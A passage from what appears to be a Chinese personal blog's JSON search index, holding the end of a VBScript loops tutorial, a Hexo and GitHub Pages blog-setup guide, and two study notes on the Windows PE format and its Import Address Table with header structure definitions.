codeNext\n\n如果要递减计数变量，就必须使用负的 Step 值。并且必须规定小于开始值的结束值。\n在下面的实例中，计数变量（i）每次循环的递减步进值为 2。\n123For i=10 To 2 Step -2some codeNext\n\n退出 For…Next可以通过 Exit For 关键词退出 For…Next 语句。\n1234For i=1 To 10If i=5 Then Exit Forsome codeNext\n\n\nFor Each…Next 循环For Each…Next 针对集合中的每个项目或者数组中的每个元素来重复运行某段代码。\n实例12345678910111213141516&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim cars(2)cars(0)=&quot;Volvo&quot;cars(1)=&quot;Saab&quot;cars(2)=&quot;BMW&quot;For Each x In carsdocument.write(x &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\nDo…Loop如果不知道重复多少次，可以使用 Do…Loop 语句。\nDo…Loop 语句重复执行某段代码直到条件是 true 或条件变成 true。\n重复执行代码直到条件是 true可以使用 While 关键字来检查 Do… Loop 语句的条件。\n123Do While i&gt;10some codeLoop\n\n如果 i 等于 9，上述循环内的代码将终止执行。\n123Dosome codeLoop While i&gt;10\n\n这个循环内的代码将被执行至少一次，即使 i 小于 10。\n重复执行代码直到条件变成 true可以使用 Until 关键字来检查 Do…Loop 语句的条件。\n123Do Until i=10some codeLoop\n\n如果 i 等于 10，上述循环内的代码将终止执行。\n123Dosome codeLoop Until i=10\n\n这个循环内的代码将被执行至少一次，即使 i 等于 10。\n退出 Do…Loop可以通过 Exit Do 关键词退出 Do…Loop 语句。\n1234Do Until i=10i=i-1If i&lt;10 Then Exit DoLoop\n\n这个循环内的代码，只要 i 不为 10 且 i 大于 10 时都将被执行。\n","slug":"VBScript教程","date":"2022-03-15T14:05:53.000Z","categories_index":"编程","tags_index":"编程,VBScript","author_index":"0netry"},{"id":"f48f1848e82a474528d06090473058c1","title":"GitHub搭建自己的博客","content":"安装Node.js根据自己的电脑安装对应的版本，安装选项全部默认，一路点击Next。\n安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，则表示安装成功。\n\n\n\n\n添加国内镜像源或使用cnpm如果没有梯子的话，可以使用阿里的国内镜像进行加速\n1npm config set registry https://registry.npm.taobao.org\n\n或安装淘宝cnpm\n1npm install -g cnpm --registry=https://registry.npm.taobao.org\n\n\n\n安装Hexo首先新建一个文件夹，用来存放自己的博客文件。\n在该目录下右键点击Git Bash Here，打开git的控制台窗口。\n定位到该目录下，输入npm i hexo-cli -g安装Hexo。会有几个报错，无视它就行。\n安装完后输入hexo -v验证是否安装成功。\n然后输入hexo init初始化文件夹，接着输入npm install安装必备的组件。\n这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到博客啦。\n注：①按ctrl+c关闭本地服务器，若无法结束，则打开任务管理器，结束名为Node.js JavaScript Runtime的任务即可。\n② 卸载hexo命令npm uninstall hexo-cli -g。\n连接Github与本地首先右键打开git bash，然后输入下面命令：\n12git config --global user.name &quot;username&quot;git config --global user.email &quot;your email address&quot;\n\n用户名和邮箱根据注册github的信息自行修改。\n配置ssh① 首先在用户主目录下使用如下命令查看SSH keys是否存在\n12ls -al ~/.sshLists the files in your .ssh directory, if they exist\n\n② 若不存在，打开用户主目录，Git Bash Here，使用如下命令创建SSH Key：\n1ssh-keygen -t rsa -C &quot;youremail@example.com&quot;\n\n你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，由于这个Key也不是用于军事目的，所以也无需设置密码。\n如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。\n\n\n\n\n③  SSH key创建成功后，cd .ssh进入.ssh文件夹，cat id_rsa.pub查看公钥内容\n④ 登陆GitHub，打开“Account settings”，“SSH Keys”页面：\n然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容\n\n\n\n\n更改主题这里以使用Aurora主题为例：\n步骤 1 - 安装主题① 在控制台中，进入 Hexo 项目的根目录，然后运行以下命令安装主题\n1npm install hexo-theme-aurora --save\n\n步骤 2 - 生成主题配置因为主题是使用 NPM 或者 Yarn 安装的，而不是 clone 到 themes 文件夹的。所以需要自己创建一个配置文件。只需要在 Hexo 博客的根目录下创建一个 _config.aurora.yml 配置文件来配置主题。\n获取一个默认的主题配置模版\n\n可以执行以下命令，但是这个命令只能在 Linux 或者 MacOS 下执行，如果你用的是 Windows 系统，可以自行在 node_modules 中找到对应目录复制过来\n\n1cp -rf ./node_modules/hexo-theme-aurora/_config.yml ./_config.aurora.yml\n\n步骤 3 - 设置permalink\n\n\n\n\n\n\n\n\n因为使用了 Vue-router，Hexo 默认生成的页面和文章的 permalink 与 Vue router 中的 path 是不相符的，就会出现无法访问的问题。所以需要修改 Hexo 默认配置文件里面的 permalink 参数。\n#步骤 3.1打开在 Hexo 根目录下的 _config.yml\n#步骤 3.2修改 permalink 参数为 /post/:title.html\n12345678# URL## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;url: https://tridiamond.techpermalink: /post/:title.htmlpermalink_defaults:pretty_urls:  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks\n\n步骤4 - 重新生成与本地服务器\n\n\n\n\n\n\n\n\n使用以下命令来运行本地环境。\n1hexo clean &amp; hexo g &amp; hexo server\n\n提示\n改变了任何配置都需要重新生成 Hexo 的静态文件！\n当文件都生成完毕之后，就可以通过 https://localhost:4000在新窗口打开 访问你的博客了。\n写文章、发布文章首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。\n然后输入hexo new post &quot;article title&quot;，新建一篇文章。\n然后打开D:\\study\\program\\blog\\source\\_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。\n编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。\n注意事项：修改分支由于在_config.yml中设置了提交分支为master，所以需要在GitHub中也进行设置\n仓库首页，默认是main，修改成master\n\n\n\n\nSettings -&gt; Pages -&gt;Source，默认是main，修改成master并Save\n\n\n\n\n配置 _config.yml中有关deploy的部分如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。\n首先，ssh key肯定要配置好。\n其次，配置_config.yml中有关deploy的部分：\n正确写法：\n1234deploy:  type: git  repository: git@github.com:liuxianan/liuxianan.github.io.git  branch: master\n\n错误写法：\n1234deploy:  type: github  repository: https://github.com/liuxianan/liuxianan.github.io.git  branch: master\n\n后面一种写法是hexo2.x的写法，现在已经不行了，无论是哪种写法，此时直接执行hexo d的话一般会报如下错误：\n1Deployer not found: github 或者 Deployer not found: git\n\n原因是还需要安装一个插件：\n1npm install hexo-deployer-git --save\n\n其它命令不确定，部署这个命令一定要用git bash，否则会提示Permission denied (publickey).\n打开你的git bash，输入hexo d就会将本次有改动的代码全部提交，没有改动的不会\n遇到的问题hexo g 时报错 err: Error: Cannot find module ‘truncate-html’\n\n解决办法根据报错安装对应的模块npm install module_name\n参考超详细Hexo+Github博客搭建小白教程\n使用hexo+github搭建免费个人博客详细教程\nGitHub+Hexo 搭建个人网站详细教程\nHexo Aurora中文指南\n","slug":"GitHub搭建自己的博客","date":"2022-02-15T15:24:16.000Z","categories_index":"","tags_index":"搭建博客","author_index":"0netry"},{"id":"72108d70d9a862b742fe8e97b0c6b415","title":"PE解析——IAT","content":"IAT全称Import Address Table，即导入地址表\nIMAGE_IMPORT_DESCRIPTOR结构体123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;    union &#123;        DWORD   Characteristics;            // 0 for terminating null import descriptor        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT                                                           // (PIMAGE_THUNK_DATA)    &#125; DUMMYUNIONNAME;    DWORD   TimeDateStamp;                  // 0 if not bound,                                            // -1 if bound, and real date\\time stamp                                            // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new                                             // BIND)                                            // O.W. date/time stamp of DLL bound to (Old                                             //BIND)    DWORD   ForwarderChain;                 // -1 if no forwarders    DWORD   Name;    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual \t\t\t\t\t\t\t\t\t\t\t   addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;\n\n每一个这样的结构体都代表了一个外部模块，导入多少库就存在多少个IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体形成了数组，且结构体数组最后以NULL结构体结束\n\nIMAGE_THUNK_DATA结构体32位：\n123456789typedef struct _IMAGE_THUNK_DATA32 &#123;    union &#123;        DWORD ForwarderString;      // PBYTE，指向一个转向者字符串的RVA        DWORD Function;             // PDWORD，被输入的函数的内存地址        DWORD Ordinal;              // 被输入的API 的序数值        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME，指向 IMAGE_IMPORT_BY_NAME    &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;\n\n\n64位：\n123456789typedef struct _IMAGE_THUNK_DATA64 &#123;    union &#123;        ULONGLONG ForwarderString;  // PBYTE         ULONGLONG Function;         // PDWORD        ULONGLONG Ordinal;        ULONGLONG AddressOfData;    // PIMAGE_IMPORT_BY_NAME    &#125; u1;&#125; IMAGE_THUNK_DATA64;typedef IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;\n\n一个IMAGE_THUNK_DATA结构实际上就是一个双字，之所以把它定义成结构，是因为它在不同时刻有不同的含义：\n当IMAGE_THUNK_DATA 值的最高位为 1时，表示函数以序号方式输入，这时候低 31位被看作一个函数序号。（读者可以用预定义值IMAGE_ORDINAL_FLAG32或80000000h来对最高位进行测试）当 IMAGE_THUNK_DATA 值的最高位为 0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个 RVA，指向一IMAGE_IMPORT_BY_NAME 结构。\nIMAGE_IMPORT_BY_NAME结构体1234typedef struct _IMAGE_IMPORT_BY_NAME &#123;    WORD    Hint;    CHAR   Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n\n\nHint字段：指示本函数在其所驻留的输出表的中序号该域被PE装载器用来在DLL的输出表里快速查询。该值不是必须的，一些链接器将此值设为0；\nNAME字段：这个字段比较重要。它含有输入函数的函数名，函数名是一个ASCII码字符串，并以NULL结尾。注意，这里虽然将NAME的大小定义为字节，其实他是可变的。\nINT就是由多个IMAGE_IMPORT_BY_NAME结构体组成\n\n\n\n\n\n\n\n\n\nINT与IAT是长整型（4个字节数据类型）数组，以NULL结束\nINT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针（有时IA6也拥有相同的值）\nINT与IAT的大小应相同\n\nIMAGE_IMPORT_DESCRIPTOR结构体重要成员OriginalFirstThunkINT的地址（RVA）\n这个字段包含指向输入名称表（简称INT，Import Name Table）的RVA，INT是一个IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构指向IMAGE_IMPORT_BY_NAME结构，数组最后以一个内容为0的IMAGE_THUNK_DATA结构结束。\n直接看这个描肯定感觉很绕，下面看看这几个结构的关系图，希望能够帮助理解（其实就是1指向2再指向3）：\n\nName它表示DLL 名称的相对虚地址（译注：相对一个用null作为结束符的ASCII字符串的一个RVA，该字符串是该导入DLL文件的名称，如：KERNEL32.DLL）。\nFirstThunkIAT的地址（RVA）\n包含指向输入地址表（IAT，Import Address Table）的RVA。IAT也是指向IAMGE_THUNK_DATA结构。\n指向一个包含一系列IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构定义了一个导入函数的信息，数组最后以一个内容为0的IMAGE_THUNK_DATA结构作为结束。\n导入表中第一个IMAGE_IMPORT_DESCRIPTOR结构的FirstThunk字段指向的就是IAT的起始地址。也可以通过数据目录表的第13项找到IAT数据块的位置和大小。\nPE加载器通过Name成员拿到DLL名称,再通过OriginalFirstThunk成员拿到函数名,之后通过GetProcAddress获取函数地址后填写到FirstThunk成员中\n输入地址表（IAT，Import Address Table） 接下来要讲的才是最为关键的部分。通过上面的了解大概我们都会疑惑为啥这两个数组都要指向IMAGR_IMPORT_BY_NAME结构？原因如下：\n当PE文件被装入内存的时候，其中一个数组的值将被改作他用，正如上面分析的，Windows装载器会将指令Jmp dword ptr[xxxxxxxx]指定的xxxxxxxx处的RVA替换成真正的函数地址，其实xxxxxxx地址正是FirstThunk字段指向的那个数组的一员。\n实际上，当PE文件被装入内存后，内存中的映象就被Windows装载器修正成了下图的样子，其中由FirstThunk字段指向的那个数组中的每个双字都被替换成了真正的函数入口地址，之所以在PE文件中使用两份IMAGE_THUNK_DATA 数组的拷贝并修改其中的一份，是为了最后还可以留下一份拷贝用来反过来查询地址所对应的导入函数名。\n第一，第一个由OriginalFrist通过IMAGE_THUNK_DATA结构所指向的IMAGE_IMPORT_BY_NAME是单独的一项，而且IMAGE_THUNK_DATA的值不可以更改，这个IMAGE_THUNK_DATA组成的数组就是INT，其实它是为FristThunk做为提示用的。\n第二，第二个由FristThunk所指向的IMAGE_THUNK_DATA的值是由PE装载器填写的，他们的值构成了IAT。PE装载器首先搜索OringinalFristThunk，通过它所指向的INT结构中的每个IMAGE_IMPORT_BY_NAME所指向的每个被载入函数的地址。然后通过加载器将值填充到FristThunk指向的IAT表中。\n\n\n\n\n\n\n\n\n\nPE装载器把导入函数输入至IAT的顺序：\n1.读取IID（IMAGE_IMPORT_DESCRIPTOR）的Name成员，获取库名称字符串（”kernel32.dll”）\n2.装载相应库\n-&gt;LoadLibrary(“kernel32.dll”)\n3.读取IID的OriginalFirstThunk成员，获取INT（Import Name Table）地址\n4.逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址（RVA）\n5.使用IMAGE_IMPORT_BY_NAME的Hint（ordinal）或Name项，获取相应函数的起始地址\n-&gt;GetProcAddress(“GetCurrentThreaadld”)\n6.读取IID的FirstThunk（IAT）成员，获取IAT地址\n7.将上面获得的函数地址输入相应IAT数组值\n8.重复以上步骤4-7，直到INT结束（遇到NULL时）\n接下来对比一下加载前后的INT表和IAT表值变化：\n\n\n可以看到， 加载后，显示IAT的值已经填充了函数地址\n解析PE结构IAT思路123456789//解析PE文件结构HMODULE hModImageBase = GetModuleHandle(NULL); //获取当前的ImagBase(基址)PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)(DWORD)hModImageBase; //获取DOS头DWORD dwTemp = (DWORD)pDosHead + (DWORD)pDosHead-&gt;e_lfanew;PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)dwTemp;  //获取NT头PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp; pNtHead-&gt;FileHeader;  //获取标准PE头PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp; pNtHead-&gt;OptionalHeader;  //获取扩展PE头DWORD dwImportLocal = pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; //找到导入表的偏移(RVA)PIMAGE_IMPORT_DESCRIPTOR   pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)GetModuleHandle(NULL) + dwImportLocal);  //获取导入表\n\n参考链接Windows系统32位可执行文件格式笔记①\nWindows系统32位可执行文件格式笔记②\nWindows系统32位可执行文件格式笔记③\nWindows PE权威指南(导入表)\n《PE总结 》\nPE文件格式详解(五)\n","slug":"PE解析——IAT","date":"2021-12-23T11:51:51.000Z","categories_index":"","tags_index":"逆向,PE文件,IAT","author_index":"0netry"},{"id":"cb93d0cd82726110c8a724aa5589f118","title":"PE文件格式","content":"PE文件种类\n\n\n种类\n主扩展名\n\n\n\n可执行系列\nEXE、SRC\n\n\n库系列\nDLL、OCX、CPL、DRV\n\n\n驱动程序系列\nSYS、VXD\n\n\n对象文件系列\nOBJ\n\n\n严格来说，OBJ文件之外的所有文件都是可执行的。DLL、SYS文件等虽然不能直接在shell（Explorer.exe）中运行，但可以使用其他方法（调试器、服务等）执行。\n基本结构从DOS头（DOS Header）到节区头（Section Header）是PE头部分，其下的节区合成PE体。\n文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。\nVA&amp;RVAVA指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准位置（I    mageBase）开始的相对地址。VA与RVA满足下面的换算关系：\n1RVA+ImageBase=VA\n\nPE头DOS头（IMAGE_DOS_HEADER）IMAGE_DOS_HEADER结构体IMAGE_DOS_HEADER结构体的大小为64字节。其定义如下：\n12345678910111213141516171819202122typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header    WORD   e_magic;                     // Magic number    WORD   e_cblp;                      // Bytes on last page of file    WORD   e_cp;                        // Pages in file    WORD   e_crlc;                      // Relocations    WORD   e_cparhdr;                   // Size of header in paragraphs    WORD   e_minalloc;                  // Minimum extra paragraphs needed    WORD   e_maxalloc;                  // Maximum extra paragraphs needed    WORD   e_ss;                        // Initial (relative) SS value    WORD   e_sp;                        // Initial SP value    WORD   e_csum;                      // Checksum    WORD   e_ip;                        // Initial IP value    WORD   e_cs;                        // Initial (relative) CS value    WORD   e_lfarlc;                    // File address of relocation table    WORD   e_ovno;                      // Overlay number    WORD   e_res[4];                    // Reserved words    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)    WORD   e_oeminfo;                   // OEM information; e_oemid specific    WORD   e_res2[10];                  // Reserved words    LONG   e_lfanew;                    // File address of new exe header  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;                                                                        //winnt.h\n\n\n重要成员e_magic（0x00）DOS签名（4D5A&#x3D;&gt;ASCII值”MZ”）\ne_lfanew（0x3c）指示NT头（IMAGE_NT_HEADERS）的偏移\nDOS存根（IMAGE_DOS_STUB）IMAGE_DOS_STUB\nNT头（IMAGE_NT_HEADERS）（0x3c）32位12345typedef struct _IMAGE_NT_HEADERS &#123;    DWORD Signature;                           //PE Signature：50450000（&quot;PE&quot;00）    IMAGE_FILE_HEADER FileHeader;              //文件头    IMAGE_OPTIONAL_HEADER32 OptionalHeader;    //可选头&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n\n\n64位12345typedef struct _IMAGE_NT_HEADERS64 &#123;    DWORD Signature;                         //PE Signature：50450000（&quot;PE&quot;00）    IMAGE_FILE_HEADER FileHeader;            //文件头    IMAGE_OPTIONAL_HEADER64 OptionalHeader;  //可选头&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;\n\nNT头：文件头（0x04）IMAGE_FILE_HEADER结构体123456789typedef struct _IMAGE_FILE_HEADER &#123;    WORD    Machine;    WORD    NumberOfSections;    DWORD   TimeDateStamp;    DWORD   PointerToSymbolTable;    DWORD   NumberOfSymbols;    WORD    SizeOfOptionalHeader;    WORD    Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n\n重要成员Machine（0x00）每个CPU都拥有唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C。其他定义如下：\n1234567891011121314151617181920212223242526272829303132#define IMAGE_FILE_MACHINE_UNKNOWN           0#define IMAGE_FILE_MACHINE_TARGET_HOST       0x0001  // Useful for indicating we want to                                                         interact with the host and not a                                                         WoW guest.#define IMAGE_FILE_MACHINE_I386              0x014c  // Intel 386.#define IMAGE_FILE_MACHINE_R3000             0x0162  // MIPS little-endian, 0x160 big-                                                           endian#define IMAGE_FILE_MACHINE_R4000             0x0166  // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000            0x0168  // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA             0x0184  // Alpha_AXP#define IMAGE_FILE_MACHINE_SH3               0x01a2  // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3DSP            0x01a3#define IMAGE_FILE_MACHINE_SH3E              0x01a4  // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4               0x01a6  // SH4 little-endian#define IMAGE_FILE_MACHINE_SH5               0x01a8  // SH5#define IMAGE_FILE_MACHINE_ARM               0x01c0  // ARM Little-Endian#define IMAGE_FILE_MACHINE_THUMB             0x01c2  // ARM Thumb/Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_ARMNT             0x01c4  // ARM Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_AM33              0x01d3#define IMAGE_FILE_MACHINE_POWERPC           0x01F0  // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_POWERPCFP         0x01f1#define IMAGE_FILE_MACHINE_IA64              0x0200  // Intel 64#define IMAGE_FILE_MACHINE_MIPS16            0x0266  // MIPS#define IMAGE_FILE_MACHINE_ALPHA64           0x0284  // ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU           0x0366  // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  // MIPS#define IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_TRICORE           0x0520  // Infineon#define IMAGE_FILE_MACHINE_CEF               0x0CEF#define IMAGE_FILE_MACHINE_EBC               0x0EBC  // EFI Byte Code#define IMAGE_FILE_MACHINE_AMD64             0x8664  // AMD64 (K8)#define IMAGE_FILE_MACHINE_M32R              0x9041  // M32R little-endian#define IMAGE_FILE_MACHINE_ARM64             0xAA64  // ARM64 Little-Endian#define IMAGE_FILE_MACHINE_CEE               0xC0EE\n\nNumberOfSectionsNumberOfSections用来指出文件中存在的节区数量。该值一定要大于0，且当定义的节区数量与实际节区不同时，将发生运行错误。\nSizeOfOptionalHeaderSizeOfOptionalHeader用来指出IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER32结构体的长度。\nPE32+格式的文件使用的是IMAGE_OPTIONAL_HEADER64结构体。\nCharacteristics该字段用于标识文件的属性，文件是否是可运行的形态、是否为DLL文件等信息，以bit OR形式组合起来（常见0002h和2000h）。\n定义如下：\n123456789101112131415#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from                                                             file.#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no                                                             unresolved external references).#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Aggressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are                                                                 reversed.#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file                                                         in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media,                                                           copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run                                                         from the swap file.#define IMAGE_FILE_SYSTEM                    0x1000  // System File.#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP                                                           machine#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are                                                                 reversed.\n\nNT头：可选头（0x18）IMAGE_OPTIONAL_HEADER32结构体1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253typedef struct _IMAGE_DATA_DIRECTORY &#123;    DWORD   VirtualAddress;    DWORD   Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16//// Optional header format.//typedef struct _IMAGE_OPTIONAL_HEADER &#123;    //    // Standard fields.    //    WORD    Magic;    BYTE    MajorLinkerVersion;    BYTE    MinorLinkerVersion;    DWORD   SizeOfCode;    DWORD   SizeOfInitializedData;    DWORD   SizeOfUninitializedData;    DWORD   AddressOfEntryPoint;    DWORD   BaseOfCode;    DWORD   BaseOfData;    //    // NT additional fields.    //    DWORD   ImageBase;    DWORD   SectionAlignment;    DWORD   FileAlignment;    WORD    MajorOperatingSystemVersion;    WORD    MinorOperatingSystemVersion;    WORD    MajorImageVersion;    WORD    MinorImageVersion;    WORD    MajorSubsystemVersion;    WORD    MinorSubsystemVersion;    DWORD   Win32VersionValue;    DWORD   SizeOfImage;    DWORD   SizeOfHeaders;    DWORD   CheckSum;    WORD    Subsystem;    WORD    DllCharacteristics;    DWORD   SizeOfStackReserve;    DWORD   SizeOfStackCommit;    DWORD   SizeOfHeapReserve;    DWORD   SizeOfHeapCommit;    DWORD   LoaderFlags;    DWORD   NumberOfRvaAndSizes;    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n\n\n重要成员Magic为IMAGE_OPTIONAL_HEADER32结构体时，Magic码为10B；为IMAGE_OPTIONAL_HEADER64结构体时，Magic码为20B\nImageBaseSectionAlignment、FileAlignmentSizeOfImageSizeOfHeadersSubsystemDllCharacteristics1234567891011121314151617// DllCharacteristics Entries//      IMAGE_LIBRARY_PROCESS_INIT            0x0001     // Reserved.//      IMAGE_LIBRARY_PROCESS_TERM            0x0002     // Reserved.//      IMAGE_LIBRARY_THREAD_INIT             0x0004     // Reserved.//      IMAGE_LIBRARY_THREAD_TERM             0x0008     // Reserved.#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA    0x0020  // Image can handle a high entropy 64-bit virtual address space.#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040     // DLL can move.#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY    0x0080     // Code Integrity Image#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT    0x0100     // Image is NX compatible#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200     // Image understands isolation and doesn&#x27;t want it#define IMAGE_DLLCHARACTERISTICS_NO_SEH       0x0400     // Image does not use SEH.  No SE handler may reside in this image#define IMAGE_DLLCHARACTERISTICS_NO_BIND      0x0800     // Do not bind this image.#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000     // Image should execute in an AppContainer#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER   0x2000     // Driver uses WDM model#define IMAGE_DLLCHARACTERISTICS_GUARD_CF     0x4000     // Image supports Control Flow Guard.#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE     0x8000\n\n\n\nNumberOfRvaAndSizesDataDirectoryDataDirectory是由IMAGE_DATA_DIRECTORY结构体组成的数组\n1234typedef struct _IMAGE_DATA_DIRECTORY &#123;    DWORD   VirtualAddress;    DWORD   Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\n\n数组每项的定义\n12345678910111213141516171819// Directory Entries#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptorReserved Directory\n\n","slug":"PE文件格式","date":"2021-12-21T12:42:30.000Z","categories_index":"","tags_index":"逆向,PE文件","author_index":"0netry"}]